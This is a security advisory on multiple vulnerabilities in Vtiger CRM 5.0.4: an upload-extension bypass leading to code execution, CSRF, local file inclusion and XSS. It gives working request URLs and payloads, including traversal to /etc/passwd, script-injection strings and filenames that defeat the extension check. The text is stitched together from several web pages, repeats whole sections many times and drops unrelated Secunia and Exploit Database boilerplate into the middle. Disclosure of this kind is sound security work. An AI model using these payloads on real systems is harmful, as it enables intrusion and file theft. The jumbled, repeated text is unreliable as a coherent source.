I. BACKGROUND
Vtiger CRM is a free, full-featured, 100% Open Source CRM software ideal
for small and medium businesses, with low-cost product support available
to production users that need reliable support.
II. DESCRIPTION
Multiple Vulnerabilities exist in Vtiger CRM software.
Some of the technical issues highlighted in this advisory are part of a
wider publication, "PHP filesystem attack vectors - Take Two", and are
generic to applications written in the PHP language:
http://www.ush.it/2009/07/26/php-filesystem-attack-vectors-take-two/
III. ANALYSIS
Summary:
A) Remote Code Execution (RCE) Vulnerability
B) Cross Site Request Forgery (CSRF) Vulnerabilities
C) Local File Inclusion (LFI) Vulnerability
D) Cross Side Scripting (XSS) Vulnerability
A) Remote Code Execution (Windows Only) Vulnerability
A Remote Code Execution vulnerability exists in Vtiger CRM version
5.0.4. In order to exploit this vulnerability an account on the CRM
system is required.
The vulnerability resides in the "Compose Mail" section. The software
permits sending email with attachments and offers a draft save feature.
When this feature is requested and an attachment is specified, the
"saveForwardAttachments" validation routine is called.
This routine involves some security checks to handle uploaded files, it
does blacklist extension checking and if a bad extension is detected the
txt extension is appended to the file-name.
The following is the specific section:
--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--
$ext\_pos = strrpos($binFile, ".");
$ext = substr($binFile, $ext\_pos + 1);
if (in\_array(strtolower($ext), $upload\_badext))
{
$binFile .= ".txt";
}
--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--
It's known that in some circostances (for example when the PHP handler
is configured using AddType/Action/AddHandler globally, eg. not inside
an Apache's Files/FilesMatch directive) blacklisting is not enough as
files in the form of "filename.php.foo" will be mapped back to PHP
anyway (since foo is not explicitly defined in the MIME map and Apache
will try to guess the filetype by its own).
Beside this known issue we want to point out a less known exploitation
methodology that works on Windows hosts.
First the attacker has to find the name of the file that was uploaded
in the attachment list files. Vtiger CRM saves files in a path like:
storage/2009/July/week1/
And prepends an incremental unique number to the filename like:
133\_foo.php
So, a hypothetical attacker has only to guess the prepended number. This
can be done by bruteforcing or by requesting the url:
http://127.0.0.1/vtigercrm/index.php?module=Emails&action=ListView
At this page Vtiger CRM shows the list of all the emails sent and saved,
and for every email it allows to download the attachment showing its
unique id in the link.
http://127.0.0.1/vtigercrm/index.php?module=uploads&action=downloadfile&
return\_module=Emails&fileid=133&entityid=136
So, finally, the link to exploit this vulnerability should be something like:
http://127.0.0.1/vtigercrm/storage/2009/July/week1/133.foo.php
While Vtiger CRM blocks known dangerous extensions (like .php) making
direct exploitation impossible it has to be highlighted that this simple
estension check is totally improper since it does not consider specific
filenames and behaviours of the operating systems where Vtiger CRM is
deployed.
For example on Windows OS is possible to exploit this vulnerability by
requesting an upload with the filename "foo.php.".
This string will bypass the check and since Windows does not permit
filenames ending with a dot, modifying it in a transparent way, the final
name of the file will simply be "foo.php.".
A similar result can be obtained on GNU/Linux by requesting an upload
with the filename "foo.php/."
Note that the integrated webmail feature that allows a user to write
emails and eventually save a draft of them is authenticated (a valid
user on the system is required in order to exploit this vulnerability).
B) Multiple CSRF (Cross Site Request Forgery) Vulnerabilites
Multiple CSRF vulnerabilities exist in vtiger crm version 5.0.4.
Here's a demonstrative one (an Admin user has to follow this link):
http://127.0.0.1/vtigercrm/index.php?module=Rss&action=Save&rssurl=http:
//www.ush.it/feed
The feed is added to the news feed system visible by the crm users.
Other and more dangerous CSRF vulnerabilities exist.
C) Local File Inclusion
Some LFI vulnerabilities exist in Vtiger CRM version 5.0.4.
Some examples:
1) http://127.0.0.1/vtigercrm/graph.php?module=/../[..]/../etc/passwd%00
2) http://127.0.0.1/vtigercrm/index.php?module=Accounts&action=Import&pa
renttab=Support&step=/../[..]/../etc/passwd%00
Add as many "../" instead of the "[..]" placeholder as needed.
The first one does not need a valid user account, the second one is
authenticated.
Other modules are vulnerable to LFI, for example those who include
"Import/index.php" where the vulnerability resides:
--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--
grep "Import/index.php" \* -R
modules/Accounts/Import.php: include('modules/Import/index.php');
modules/Contacts/Import.php: include('modules/Import/index.php');
modules/HelpDesk/Import.php: include('modules/Import/index.php');
modules/Leads/Import.php: include('modules/Import/index.php');
modules/Potentials/Import.php: include('modules/Import/index.php');
modules/Products/Import.php: include('modules/Import/index.php');
modules/Vendors/Import.php: include('modules/Import/index.php');
--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--
A third LFI vulnerability has been found in "CommonAjax.php", both
"module" and "file" parameters are vulnerable.
http://127.0.0.1/vtigercrm/include/Ajax/CommonAjax.php?module=Email&file=bar
Will lead to a call like "require\_once(modules/Email/bar.php)".
If direct access to "CommonAjax.php" has been forbidden other entry
points can be used:
--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--
grep "Ajax/CommonAjax.php" \* -R
modules/Campaigns/CampaignsAjax.php: require\_once('include/Ajax/CommonAjax.php');
modules/SalesOrder/SalesOrderAjax.php: require\_once('include/Ajax/CommonAjax.php');
modules/System/SystemAjax.php: require\_once('include/Ajax/CommonAjax.php');
modules/Products/ProductsAjax.php: require\_once('include/Ajax/CommonAjax.php');
modules/uploads/uploadsAjax.php: require\_once('include/Ajax/CommonAjax.php');
modules/Dashboard/DashboardAjax.php: require\_once('include/Ajax/CommonAjax.php');
modules/Potentials/PotentialsAjax.php: require\_once('include/Ajax/CommonAjax.php');
modules/Notes/NotesAjax.php: require\_once('include/Ajax/CommonAjax.php');
modules/Faq/FaqAjax.php: require\_once('include/Ajax/CommonAjax.php');
modules/Quotes/QuotesAjax.php: require\_once('include/Ajax/CommonAjax.php');
modules/Utilities/UtilitiesAjax.php: require\_once('include/Ajax/CommonAjax.php');
modules/Calendar/ActivityAjax.php: require\_once('include/Ajax/CommonAjax.php');
modules/Calendar/CalendarAjax.php: require\_once('include/Ajax/CommonAjax.php');
modules/PurchaseOrder/PurchaseOrderAjax.php: require\_once('include/Ajax/CommonAjax.php');
modules/HelpDesk/HelpDeskAjax.php: require\_once('include/Ajax/CommonAjax.php');
modules/Invoice/InvoiceAjax.php: require\_once('include/Ajax/CommonAjax.php');
modules/Accounts/AccountsAjax.php: require\_once('include/Ajax/CommonAjax.php');
modules/Reports/ReportsAjax.php: require\_once('include/Ajax/CommonAjax.php');
modules/Contacts/ContactsAjax.php: require\_once('include/Ajax/CommonAjax.php');
modules/Portal/PortalAjax.php: require\_once('include/Ajax/CommonAjax.php');
--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--
To use one of these files as gateway for the previous vulnerability
issue a request like the following:
http://127.0.0.1/vtigercrm/?module=Invoice&action=InvoiceAjax&file=bar
Where "Invoice" and "InvoiceAjax" are values from the presented list.
This LFI vulnerability is not exploitable if you have applied a separate
patch available at the following url:
https://sourceforge.net/projects/vtigercrm/files/vtiger%20CRM%205.0.4%20
Latest%20Stable/VtigerCRM504\_Security\_Patch.zip
We question ourself about the usefulness of such patch without a proper
release. Probably little or no Vtiger CRM customers have applied such
patch.
D) Cross Side Scripting vulnerabilites
Some XSS vulnerabilities exist in Vtiger CRM version 5.0.4.
For example:
http://127.0.0.1/vtigercrm/phprint.php?module=Activities&action=--%3E%3C
script%3Ealert(%22ush.it%22);%3C/script%3E%3C!--
Or:
http://127.0.0.1/vtigercrm/index.php?action=UnifiedSearch&module=Home&pa
renttab=My+Home+Page&query\_string=%27%22%3E%3Cscript%3Ealert(123)%3C/scr
ipt%3E

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

I. BACKGROUND

Vtiger CRM is a free, full-featured, 100% Open Source CRM software ideal
for small and medium businesses, with low-cost product support available
to production users that need reliable support.

II. DESCRIPTION

Multiple Vulnerabilities exist in Vtiger CRM software.

Some of the technical issues highlighted in this advisory are part of a
wider publication, "PHP filesystem attack vectors - Take Two", and are
generic to applications written in the PHP language:
http://www.ush.it/2009/07/26/php-filesystem-attack-vectors-take-two/

III. ANALYSIS

Summary:

 A) Remote Code Execution (RCE) Vulnerability
 B) Cross Site Request Forgery (CSRF) Vulnerabilities
 C) Local File Inclusion (LFI) Vulnerability
 D) Cross Side Scripting (XSS) Vulnerability

A) Remote Code Execution (Windows Only) Vulnerability

A Remote Code Execution vulnerability exists in Vtiger CRM version
5.0.4. In order to exploit this vulnerability an account on the CRM
system is required.

The vulnerability resides in the "Compose Mail" section. The software
permits sending email with attachments and offers a draft save feature.
When this feature is requested and an attachment is specified, the
"saveForwardAttachments" validation routine is called.

This routine involves some security checks to handle uploaded files, it
does blacklist extension checking and if a bad extension is detected the
txt extension is appended to the file-name.

The following is the specific section:

Summary:

 A) Remote Code Execution (RCE) Vulnerability
 B) Cross Site Request Forgery (CSRF) Vulnerabilities
 C) Local File Inclusion (LFI) Vulnerability
 D) Cross Side Scripting (XSS) Vulnerability

A) Remote Code Execution (Windows Only) Vulnerability

A Remote Code Execution vulnerability exists in Vtiger CRM version
5.0.4. In order to exploit this vulnerability an account on the CRM
system is required.

The vulnerability resides in the "Compose Mail" section. The software
permits sending email with attachments and offers a draft save feature.
When this feature is requested and an attachment is specified, the
"saveForwardAttachments" validation routine is called.

This routine involves some security checks to handle uploaded files, it
does blacklist extension checking and if a bad extension is detected the
txt extension is appended to the file-name.

The following is the specific section:

--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--

$ext_pos = strrpos($binFile, ".");
$ext = substr($binFile, $ext_pos + 1);
if (in_array(strtolower($ext), $upload_badext))
{
    $binFile .= ".txt";
}

--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--

It's known that in some circostances (for example when the PHP handler
is configured using AddType/Action/AddHandler globally, eg. not inside
an Apache's Files/FilesMatch directive) blacklisting is not enough as
files in the form of "filename.php.foo" will be mapped back to PHP
anyway (since foo is not explicitly defined in the MIME map and Apache
will try to guess the filetype by its own).

Beside this known issue we want to point out a less known exploitation
methodology that works on Windows hosts.

First the attacker has to find the name of the file that was uploaded
in the attachment list files. Vtiger CRM saves files in a path like:

storage/2009/July/week1/

And prepends an incremental unique number to the filename like:

133_foo.php

So, a hypothetical attacker has only to guess the prepended number. This
can be done by bruteforcing or by requesting the url:

http://127.0.0.1/vtigercrm/index.php?module=Emails&action=ListView

At this page Vtiger CRM shows the list of all the emails sent and saved,
and for every email it allows to download the attachment showing its
unique id in the link.

http://127.0.0.1/vtigercrm/index.php?module=uploads&action=downloadfile&
return_module=Emails&fileid=133&entityid=136

So, finally, the link to exploit this vulnerability should be something
like:

http://127.0.0.1/vtigercrm/storage/2009/July/week1/133.foo.php

While Vtiger CRM blocks known dangerous extensions (like .php) making
direct exploitation impossible it has to be highlighted that this simple
estension check is totally improper since it does not consider specific
filenames and behaviours of the operating systems where Vtiger CRM is
deployed.

For example on Windows OS is possible to exploit this vulnerability by
requesting an upload with the filename "foo.php.".

This string will bypass the check and since Windows does not permit
filenames ending with a dot, modifying it in a transparent way, the final
name of the file will simply be "foo.php.".

A similar result can be obtained on GNU/Linux by requesting an upload
with the filename "foo.php/."

Note that the integrated webmail feature that allows a user to write
emails and eventually save a draft of them is authenticated (a valid
user on the system is required in order to exploit this vulnerability).

B) Multiple CSRF (Cross Site Request Forgery) Vulnerabilites

Multiple CSRF vulnerabilities exist in vtiger crm version 5.0.4.
Here's a demonstrative one (an Admin user has to follow this link):

http://127.0.0.1/vtigercrm/index.php?module=Rss&action=Save&rssurl=http:
//www.ush.it/feed

The feed is added to the news feed system visible by the crm users.

Other and more dangerous CSRF vulnerabilities exist.

C) Local File Inclusion

Some LFI vulnerabilities exist in Vtiger CRM version 5.0.4.

Some examples:

1) http://127.0.0.1/vtigercrm/graph.php?module=/../[..]/../etc/passwd%00
2) http://127.0.0.1/vtigercrm/index.php?module=Accounts&action=Import&pa
renttab=Support&step=/../[..]/../etc/passwd%00

Add as many "../" instead of the "[..]" placeholder as needed.

The first one does not need a valid user account, the second one is
authenticated.

Other modules are vulnerable to LFI, for example those who include
"Import/index.php" where the vulnerability resides:

--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--

grep "Import/index.php" * -R

modules/Accounts/Import.php: include('modules/Import/index.php');
modules/Contacts/Import.php: include('modules/Import/index.php');
modules/HelpDesk/Import.php: include('modules/Import/index.php');
modules/Leads/Import.php: include('modules/Import/index.php');
modules/Potentials/Import.php: include('modules/Import/index.php');
modules/Products/Import.php: include('modules/Import/index.php');
modules/Vendors/Import.php: include('modules/Import/index.php');

--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--

A third LFI vulnerability has been found in "CommonAjax.php", both
"module" and "file" parameters are vulnerable.

http://127.0.0.1/vtigercrm/include/Ajax/CommonAjax.php?module=Email&file=bar

Will lead to a call like "require_once(modules/Email/bar.php)".

If direct access to "CommonAjax.php" has been forbidden other entry
points can be used:

--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--

grep "Ajax/CommonAjax.php" * -R
modules/Campaigns/CampaignsAjax.php:
require_once('include/Ajax/CommonAjax.php');
modules/SalesOrder/SalesOrderAjax.php:
require_once('include/Ajax/CommonAjax.php');
modules/System/SystemAjax.php: require_once('include/Ajax/CommonAjax.php');
modules/Products/ProductsAjax.php:
require_once('include/Ajax/CommonAjax.php');
modules/uploads/uploadsAjax.php:
require_once('include/Ajax/CommonAjax.php');
modules/Dashboard/DashboardAjax.php:
require_once('include/Ajax/CommonAjax.php');
modules/Potentials/PotentialsAjax.php:
require_once('include/Ajax/CommonAjax.php');
modules/Notes/NotesAjax.php: require_once('include/Ajax/CommonAjax.php');
modules/Faq/FaqAjax.php: require_once('include/Ajax/CommonAjax.php');
modules/Quotes/QuotesAjax.php: require_once('include/Ajax/CommonAjax.php');
modules/Utilities/UtilitiesAjax.php:
require_once('include/Ajax/CommonAjax.php');
modules/Calendar/ActivityAjax.php:
require_once('include/Ajax/CommonAjax.php');
modules/Calendar/CalendarAjax.php:
require_once('include/Ajax/CommonAjax.php');
modules/PurchaseOrder/PurchaseOrderAjax.php:
require_once('include/Ajax/CommonAjax.php');
modules/HelpDesk/HelpDeskAjax.php:
require_once('include/Ajax/CommonAjax.php');
modules/Invoice/InvoiceAjax.php:
require_once('include/Ajax/CommonAjax.php');
modules/Accounts/AccountsAjax.php:
require_once('include/Ajax/CommonAjax.php');
modules/Reports/ReportsAjax.php:
require_once('include/Ajax/CommonAjax.php');
modules/Contacts/ContactsAjax.php:
require_once('include/Ajax/CommonAjax.php');
modules/Portal/PortalAjax.php: require_once('include/Ajax/CommonAjax.php');

--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--

To use one of these files as gateway for the previous vulnerability
issue a request like the following:

http://127.0.0.1/vtigercrm/?module=Invoice&action=InvoiceAjax&file=bar

Where "Invoice" and "InvoiceAjax" are values from the presented list.

This LFI vulnerability is not exploitable if you have applied a separate
patch available at the following url:

https://sourceforge.net/projects/vtigercrm/files/vtiger%20CRM%205.0.4%20
Latest%20Stable/VtigerCRM504_Security_Patch.zip

We question ourself about the usefulness of such patch without a proper
release. Probably little or no Vtiger CRM customers have applied such
patch.

D) Cross Side Scripting vulnerabilites

Some XSS vulnerabilities exist in Vtiger CRM version 5.0.4.

For example:

http://127.0.0.1/vtigercrm/phprint.php?module=Activities&action=--%3E%3C
script%3Ealert(%22ush.it%22);%3C/script%3E%3C!--

Or:

http://127.0.0.1/vtigercrm/index.php?action=UnifiedSearch&module=Home&pa
renttab=My+Home+Page&query_string=%27%22%3E%3Cscript%3Ealert(123)%3C/scr
ipt%3E

modules/Portal/PortalAjax.php: require_once('include/Ajax/CommonAjax.php');

--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--

To use one of these files as gateway for the previous vulnerability
issue a request like the following:

http://127.0.0.1/vtigercrm/?module=Invoice&action=InvoiceAjax&file=bar

Where "Invoice" and "InvoiceAjax" are values from the presented list.

This LFI vulnerability is not exploitable if you have applied a separate
patch available at the following url:

https://sourceforge.net/projects/vtigercrm/files/vtiger%20CRM%205.0.4%20
Latest%20Stable/VtigerCRM504_Security_Patch.zip

We question ourself about the usefulness of such patch without a proper
release. Probably little or no Vtiger CRM customers have applied such
patch.

D) Cross Side Scripting vulnerabilites

Some XSS vulnerabilities exist in Vtiger CRM version 5.0.4.

For example:

http://127.0.0.1/vtigercrm/phprint.php?module=Activities&action=--%3E%3C
script%3Ealert(%22ush.it%22);%3C/script%3E%3C!--

Or:

http://127.0.0.1/vtigercrm/index.php?action=UnifiedSearch&module=Home&pa
renttab=My+Home+Page&query_string=%27%22%3E%3Cscript%3Ealert(123)%3C/scr
ipt%3E

IV. DETECTION

Vtiger CRM 5.0.4 and possibly earlier versions are vulnerable.

V. WORKAROUND

Upgrade to latest version 5.1.0.

VI. VENDOR RESPONSE

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

### [Vtiger CRM 5.0.4 Multiple Vulnerabilities](/2009/08/18/vtiger-crm-504-multiple-vulnerabilities/)

August 18, 2009 at 3:55 pm - Filed under [Hacks](/category/hacks/), [Language EN](/category/language-en/) - 1780 words, reading time ~5 minutes - [Permalink](/2009/08/18/vtiger-crm-504-multiple-vulnerabilities/) - [Comments](http://news.ycombinator.com/submitlink?u=http://www.ush.it/2009/08/18/vtiger-crm-504-multiple-vulnerabilities/&t=Vtiger%20CRM%205.0.4%20Multiple%20Vulnerabilities)

In our publication [PHP filesystem attack vectors - Take Two](http://www_ush_it/2009/07/26/php-filesystem-attack-vectors-take-two/) we highlighted some issues that can occur in applications written in PHP that make use of filesystem operations. This advisory for the Vtiger CRM, version 5.0.4, application is an example on how such generic issues can impact the security of a real world application.

A) Remote Code Execution (Windows Only) Vulnerability

A Remote Code Execution vulnerability exists in Vtiger CRM version
5.0.4. In order to exploit this vulnerability an account on the CRM
system is required.

The vulnerability resides in the "Compose Mail" section. The software
permits sending email with attachments and offers a draft save feature.
When this feature is requested and an attachment is specified, the
"saveForwardAttachments" validation routine is called.

This routine involves some security checks to handle uploaded files, it
does blacklist extension checking and if a bad extension is detected the
txt extension is appended to the file-name.

The following is the specific section:

--8< --8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--

$ext_pos = strrpos($binFile, ".");
$ext = substr($binFile, $ext_pos + 1);
if (in_array(strtolower($ext), $upload_badext))
{
    $binFile .= ".txt";
}

--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--

It's known that in some circostances (for example when the PHP handler
is configured using AddType/Action/AddHandler globally, eg. not inside
an Apache's Files/FilesMatch directive) blacklisting is not enough as
files in the form of "filename.php.foo" will be mapped back to PHP
anyway (since foo is not explicitly defined in the MIME map and Apache
will try to guess the filetype by its own).

Beside this known issue we want to point out a less known exploitation
methodology that works on Windows hosts.

First the attacker has to find the name of the file that was uploaded
in the attachment list files. Vtiger CRM saves files in a path like:

storage/2009/July/week1/

And prepends an incremental unique number to the filename like:

133_foo.php

So, a hypothetical attacker has only to guess the prepended number. This
can be done by bruteforcing or by requesting the url:

http://127.0.0.1/vtigercrm/index.php?module=Emails&action=ListView

At this page Vtiger CRM shows the list of all the emails sent and saved,
and for every email it allows to download the attachment showing its
unique id in the link.

http://127.0.0.1/vtigercrm/index.php?module=uploads&action=downloadfile&
return_module=Emails&fileid=133&entityid=136

So, finally, the link to exploit this vulnerability should be something like:

http://127.0.0.1/vtigercrm/storage/2009/July/week1/133.foo.php

While Vtiger CRM blocks known dangerous extensions (like .php) making
direct exploitation impossible it has to be highlighted that this simple
estension check is totally improper since it does not consider specific
filenames and behaviours of the operating systems where Vtiger CRM is
deployed.

For example on Windows OS is possible to exploit this vulnerability by
requesting an upload with the filename "foo.php.".

This string will bypass the check and since Windows does not permit
filenames ending with a dot, modifying it in a transparent way, the final
name of the file will simply be "foo.php.".

A similar result can be obtained on GNU/Linux by requesting an upload
with the filename "foo.php/."

Note that the integrated webmail feature that allows a user to write
emails and eventually save a draft of them is authenticated (a valid
user on the system is required in order to exploit this vulnerability).

B) Multiple CSRF (Cross Site Request Forgery) Vulnerabilites

Multiple CSRF vulnerabilities exist in vtiger crm version 5.0.4.
Here's a demonstrative one (an Admin user has to follow this link):

http://127.0.0.1/vtigercrm/index.php?module=Rss&action=Save&rssurl=http:
//www_ush_it/feed

The feed is added to the news feed system visible by the crm users.

Other and more dangerous CSRF vulnerabilities exist.

C) Local File Inclusion

Some LFI vulnerabilities exist in Vtiger CRM version 5.0.4.

Some examples:

1) http://127.0.0.1/vtigercrm/graph.php?module=/../[..]/../etc/passwd%00
2) http://127.0.0.1/vtigercrm/index.php?module=Accounts&action=Import&pa
renttab=Support&step=/../[..]/../etc/passwd%00

Add as many "../" instead of the "[..]" placeholder as needed.

The first one does not need a valid user account, the second one is
authenticated.

Other modules are vulnerable to LFI, for example those who include
"Import/index.php" where the vulnerability resides:

--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--

grep "Import/index.php" * -R

modules/Accounts/Import.php: include('modules/Import/index.php');
modules/Contacts/Import.php: include('modules/Import/index.php');
modules/HelpDesk/Import.php: include('modules/Import/index.php');
modules/Leads/Import.php: include('modules/Import/index.php');
modules/Potentials/Import.php: include('modules/Import/index.php');
modules/Products/Import.php: include('modules/Import/index.php');
modules/Vendors/Import.php: include('modules/Import/index.php');

--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--

A third LFI vulnerability has been found in "CommonAjax.php", both
"module" and "file" parameters are vulnerable.

http://127.0.0.1/vtigercrm/include/Ajax/CommonAjax.php?module=Email&file=bar

Will lead to a call like "require_once(modules/Email/bar.php)".

If direct access to "CommonAjax.php" has been forbidden other entry
points can be used:

--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--

grep "Ajax/CommonAjax.php" * -R
modules/Campaigns/CampaignsAjax.php: require_once('include/Ajax/CommonAjax.php');
modules/SalesOrder/SalesOrderAjax.php: require_once('include/Ajax/CommonAjax.php');
modules/System/SystemAjax.php: require_once('include/Ajax/CommonAjax.php');
modules/Products/ProductsAjax.php: require_once('include/Ajax/CommonAjax.php');
modules/uploads/uploadsAjax.php: require_once('include/Ajax/CommonAjax.php');
modules/Dashboard/DashboardAjax.php: require_once('include/Ajax/CommonAjax.php');
modules/Potentials/PotentialsAjax.php: require_once('include/Ajax/CommonAjax.php');
modules/Notes/NotesAjax.php: require_once('include/Ajax/CommonAjax.php');
modules/Faq/FaqAjax.php: require_once('include/Ajax/CommonAjax.php');
modules/Quotes/QuotesAjax.php: require_once('include/Ajax/CommonAjax.php');
modules/Utilities/UtilitiesAjax.php: require_once('include/Ajax/CommonAjax.php');
modules/Calendar/ActivityAjax.php: require_once('include/Ajax/CommonAjax.php');
modules/Calendar/CalendarAjax.php: require_once('include/Ajax/CommonAjax.php');
modules/PurchaseOrder/PurchaseOrderAjax.php: require_once('include/Ajax/CommonAjax.php');
modules/HelpDesk/HelpDeskAjax.php: require_once('include/Ajax/CommonAjax.php');
modules/Invoice/InvoiceAjax.php: require_once('include/Ajax/CommonAjax.php');
modules/Accounts/AccountsAjax.php: require_once('include/Ajax/CommonAjax.php');
modules/Reports/ReportsAjax.php: require_once('include/Ajax/CommonAjax.php');
modules/Contacts/ContactsAjax.php: require_once('include/Ajax/CommonAjax.php');
modules/Portal/PortalAjax.php: require_once('include/Ajax/CommonAjax.php');

--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--

To use one of these files as gateway for the previous vulnerability
issue a request like the following:

http://127.0.0.1/vtigercrm/?module=Invoice&action=InvoiceAjax&file=bar

Where "Invoice" and "InvoiceAjax" are values from the presented list.

This LFI vulnerability is not exploitable if you have applied a separate
patch available at the following url:

https://sourceforge.net/projects/vtigercrm/files/vtiger%20CRM%205.0.4%20
Latest%20Stable/VtigerCRM504_Security_Patch.zip

We question ourself about the usefulness of such patch without a proper
release. Probably little or no Vtiger CRM customers have applied such
patch.

D) Cross Side Scripting vulnerabilites

Some XSS vulnerabilities exist in Vtiger CRM version 5.0.4.

For example:

http://127.0.0.1/vtigercrm/phprint.php?module=Activities&action=--%3E%3C
script%3Ealert(%22ush.it%22);%3C/script%3E%3C!--

Or:

http://127.0.0.1/vtigercrm/index.php?action=UnifiedSearch&module=Home&pa
renttab=My+Home+Page&query_string=%27%22%3E%3Cscript%3Ealert(123)%3C/scr
ipt%3E
